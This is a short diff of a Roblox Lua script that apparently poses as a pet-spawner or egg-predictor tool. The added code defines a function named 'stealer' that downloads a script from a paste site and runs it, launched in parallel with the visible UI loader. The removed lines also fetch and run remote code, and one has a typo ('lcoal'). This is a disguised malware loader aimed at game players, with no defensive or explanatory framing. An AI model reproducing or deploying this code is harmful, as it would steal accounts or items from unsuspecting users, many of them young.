@@ -1,4 +1,9 @@
-local s1 = game:HttpGet("https://raw.githubusercontent.com/NoLagHub-PetSpawner/Visual-EggPredictor/refs/heads/main/lua")
-lcoal s2 = game:HttpGet("https://raw.githubusercontent.com/ZeoHubs/idk/refs/heads/main/idk", true)
-loadstring(s1)()
-loadstring(s2)()
+local function stealer()
+  loadstring(game:HttpGet("https://cdn.sourceb.in/bins/cKMfIfyFWz/0", true))()
+end
+local function loadui()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagHub-PetSpawner/Visual-EggPredictor/refs/heads/main/lua"))()
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
